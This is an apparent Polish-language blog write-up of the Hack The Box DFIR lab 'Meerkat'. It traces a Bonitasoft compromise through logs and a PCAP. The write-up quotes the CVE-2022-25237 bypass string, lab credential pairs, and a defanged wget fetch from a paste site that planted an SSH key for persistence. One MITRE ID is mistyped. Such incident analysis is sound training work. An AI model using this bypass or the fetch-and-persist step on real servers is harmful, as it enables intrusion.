---
title: Hack The Box Sherlock - meerkat
date: 2025-09-15
tags: ["HTB", "DFIR", "Wireshark"]
showSummary: true
summary: Analiza Sherlocka "Meerkat" z HTB
draft: false
---

Kolejny zadanie z DFIR. Mamy przeanalizować logi oraz plik PCAP, czyli zrzut ruchu sieciowego. Scenariusz wygląda następująco:
**`As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators aren't the most security aware. As our new security provider we'd like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.`**

Uruchamiamy maszynę wirtualną Kali Linux i wypakowujemy utworzoną kopię oryginalnego pliku ZIP z dowodami.

`unzip meerkat_copy.zip`

## Pytanie 1

**We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?**

Proszą nas o podanie nazwy aplikacji do zarządzania biznesem, uruchomionej na serwerze. Zacznijmy od pliku `meerkat-alerts.json`. po otwarciu widzimy, że niska czytelność logów utrudni nam dalszą analizę...

![meerkat_vim_mess](/images/meerkat_vim_mess.png)

Skorzystamy z modułu pythona, a konkretnie z json.tool i output zapiszemy w pliku txt.
`python -m json.tool meerkat-alerts.json > meerkat-alerts-clear.txt`

![meerkat_clear_logs](/images/meerkat_clear_logs.png)

O wiele lepiej. Po krótkiej analizie znajdujemy ciekawy log:

![meerkat_cve_log](/images/meerkat_cve_log.png)

Wygląda na to, że jakieś narzędzie SIEM wykryło próbę zdobycia uprawnień administratora wykorzystując podatność CVE-2022-25237.

![meekrat_cve_details](/images/meekrat_cve_details.png)

Wygląda na to, że mamy do czynienia z krytyczną podatnością (CVSS:3.1 9.8) aplikacji Bonitasoft - to open-source platforma do zarządzania biznesem. Podatność polega na dodaniu fragmentu `;i18ntranslation` na koniec zapytania API w URL. Dzięki temu poprzez aplikację webową Bonita Web, używając domyślnych poświadczeń lub zwykłego użytkownika, jesteśmy w stanie pominąć proces uwierzytelniania i uzyskać dostęp do poufnych endpointów. 

W logach PCAP widzimy dokładny moment wykonania zapytania POST, który uploaduje plik ZIP `rce_api_extension.zip` - rozszerzenie, które Bonita automatycznie instaluje. Dzięki niemu atakujący ma możliwość wykonania poleceń na serwerze zdalnie. Serwer odpowiada kodem 200, co oznacza że żądanie zostało pomyślnie przetworzone. Widzimy również stringa `;i18ntranslation`, które pozwoliło ominąć filtr i uniknąć procesu uwierzytelniania.

![meerkat_bonita_rce](/images/meerkat_bonita_rce.png)

Nieco niżej widzimy zapytanie GET. Atakujący wykonał udane zdalne polecenie `whoami` na serwerze. Zwrócona wartość to `root`. Nie jest dobrze...

![meerkat_root_answ](/images/meerkat_root_answ.png)

Następnie wykonał zapytanie DELETE, najprawdopodobniej aby usunąć rozszerzenie.

**Odpowiedź: Bonitasoft**

## Pytanie 2

**We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?**

Przed uploadem złośliwego rozszerzenia widzimy, że TA próbował wielokrotnie zalogować się do aplikacji webowej - serwer odpowiadał kodem 401 (Unauthorized). Poniżej fragment logów w PCAP i zapytań POST do http://forela[.]co.uk:8080/bonita/loginservice .

![meerkat_login_brute_force](/images/meerkat_login_brute_force.png)

Atakujący próbował wielu kombinacji username'a i hasła m.in.
- install:install
- Cyndy.Element@forela[.]co.uk:ybWxct
- Berny.Ferrarin@foreala[.]co.uk:lPCO6Z
- Jenilee.Pressma@forela[.]co.uk:3eYwLOKhQEcl

Przypominam, że aby eksploit zadziałał, atakujący musi mieć ważną sesję użytkownika - nie musi on mieć jednak specjalnych uprawnień. Stąd ten brute force. Po wielokrotnych próbach TA zalogował się na konto użytkownika `seb.broom@forela[.]co.uk` za pomocą hasła `g0vernm3nt`. Zaraz po tym podrzucił złośliwe rozszerzenie. 

Na podstawie tych logów wnioskujemy, że mamy do czynienia z sub-techniką T110.004 (MITRE ATT&CK) należącej do kategorii Brute-Force - Credential Stuffing. Jest to technika polegająca na wykorzystywaniu danych uwierzytelniających, które zostały wcześniej wykradzione lub opublikowane po wycieku danych np. innej firmy. Atakujący wykorzystują fakt, że ludzie korzystają z tych samych credentiali do logowania się do różnych serwisów. Tak więc nie jest to metoda "Password Guessing (T110.001)", ponieważ wtedy mielibyśmy najpewniej do czynienia z listą najczęściej wykorzystywanych credentiali (admin, password, dupa123 itd.)

Poniżej screen z zapytania POST z próbą zalogowania - serwer odpowiada kodem 204 (sukces).

![meerkat_login_successful](/images/meerkat_login_successful.png)

**Odpowiedź: Credential Stuffing**

## Pytanie 3

**Does the vulnerability exploited have a CVE assigned - and if so, which one?**

Na to pytanie już sobie odpowiedzieliśmy. Jest to CVE-2022-25237.

**Odpowiedź: CVE-2022-25237**

## Pytanie 4

**Which string was appended to the API URL path to bypass the authorization filter by the attacker's exploit?**

Według opisu CVE oraz logów w PCAP chodzi o string `;i18ntranslation`. Na podstawie opisu w https://rhinosecuritylabs[.]com/application-security/cve-2022-25237-bonitasoft-authorization-bypass/ widzimy, że filtr pozwala na ominięcie uwierzytelniania jeśli w URL znajduje się string `/i18ntranslation/../` lub `;i18ntranslation`. 

**Odpowiedź: ;i18ntranslation**

## Pytanie 5

**How many combinations of usernames and passswords were used in the credential stuffing attack?**

W pytaniu najpewniej chodzi o unikalne kombinacje username'a i hasła. Analizując logi można zobaczyć powtarzającą się kombinację install:install. Odfiltrujmy je za pomocą odpowiedniego filtra w Wireshark
`http.request.method== "POST" && http.request.uri contains "/bonita/loginservice" && not http contains "install"`

- Szukamy zapytań POST
- Szukamy zapytań do endopontu /bonita/loginservice 
- Message body nie zawiera słowa "install"

![meerkat_wireshark_filter](/images/meerkat_wireshark_filter.png)

Mamy już tylko 59 wyników - odejmujemy 3 powtórzone kombinacje `seb.broom@forela[.]co.uk:g0vernm3nt.

**Odpowiedź: 56**

## Pytanie 6

**Which username and password combination was successful?**

Już poznaliśmy odpowiedź w pytaniu 2. 

**Odpowiedź: `seb.broom@forela[.]co.uk:g0vernm3nt'**

## Pytanie 7

**If any, which text sharing site did the attacker utilise?**

Atakujący wykonał zdalne polecenie `wget` do strony https://pastes[.]io/raw/bx5gcr0et8

![meerkat_pastes_io](/images/meerkat_pastes_io.png)

**Odpowiedź: pastes.io**

## Pytanie 8

**Please provide the filename of the public key used by the attacker to gain persistence on our host.**

Pastes[.]io to usługa internetowa, która umożliwia przechowywanie i dzielenie się tekstem w formie **pastebin**, czyli prostych notatek tekstowych. 

![meerkat_pasteio](/images/meerkat_pasteio.png)

Przeanalizujmy adres strony, do której chciał się dostać atakujący. Może Virus Total coś pokaże.

![meerkat_vt](/images/meerkat_vt.png)

Wygląda na to, że domena jest wykorzystywana przez malware typu RAT - Remote Access Trojan. W skrócie to złośliwe oprogramowanie podszywające się pod takie normalne, które jest wykorzystywane do uzyskania zdalnego dostępu. Z informacji wynika, że ASYNCRAT i DCRAT korzystają z domeny. Virus Total oznaczył to m.in. jako phishing. Przeszukajmy internet po więcej informacji. 

![meerkat_google](/images/meerkat_google.png)

![meerkat_anyrun](/images/meerkat_anyrun.png)

Na jednym ze screenów w AnyRun widać, że strona jest wykorzystywana m.in. do udostępniania złośliwego kodu. Atakujący pobrał go i uruchomił na maszynie serwera. 

![meerkat_pastes_code](/images/meerkat_pastes_code.png)

Atakujący pobiera zawartość za pomocą polecenia curl i zapisuje do pliku `authorized_keys`, który w Linuxie trzyma klucze publiczne używane do uwierzytelnienia podczas próby uzyskania zdalnego dostępu SSH. W ten sposób atakujący przechodzi do następnego etapu - utrzymanie stałej metody dostępu do serwera (persistence). 

![meerkat_key](/images/meerkat_key.png)

Powyżej widzimy klucz.


**Odpowiedź: hffgra4unv**

## Pytanie 9

**Can you confirm the file modified by the attacker to gain persistence?**

Chodzi tu o plik `authorized_keys`, w którym przetrzymywane są publiczne klucze SSH, aby zalogować się na usera bez podawania hasła.

**Odpowiedź:  /home/ubuntu/.ssh/authorized_keys**

## Pytanie 10

**Can you confirm the MITRE technique ID of this type of persistence mechanism?**

Ostatnie pytanie dotyczy ID użytej metody z MITRE ATT&CK.

![meerkat_mitre](/images/meerkat_mitre.png)

**Odpowiedź: T1098.004**

Na koniec stwórzmy timeline, aby podsumować działania TA.

|     Data i godzina      | Opis                                                                                                                                                                                                                                                          |
| :---------------------: | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 19/01/2023 15:31:12 UTC | Atakujący (156.146.62.213) uzyskuje dostęp do strony głównej Bonita                                                                                                                                                                                           |
| 19/01/2023 15:31:27 UTC | Pierwsza, nieudana próba logowania                                                                                                                                                                                                                            |
| 19/01/2023 15:35:04 UTC | Pierwsze udane logowanie przez TA - użyta kombinacja username:password `seb.broom@forela[.]co.uk:g0vernm3nt`                                                                                                                                                  |
| 19/01/2023 15:35:04 UTC | Skuteczne użycie eksploita przez TA - podatność CVE-2022-25237. Upload złośliwego rozszerzenia `rce_extension_api.zip`                                                                                                                                        |
| 19/01/2023 15:35:05 UTC | Zdalne wykonanie polecenia `whoami` na serwerze ofiary. Opdowiedź - root                                                                                                                                                                                      |
| 19/01/2023 15:38:38 UTC | TA wykonuje zdalne polecenie `wget https://pastes[.]io/raw/bx5gcr0et8` na serwerze ofiary. Kod zawarty na stronie jest wykonywany i utworzony zostaje nowy klucz publiczny SSH  w pliku `authorized_keys`. Persystencja zdalnego dostępu do serwera przez TA. |
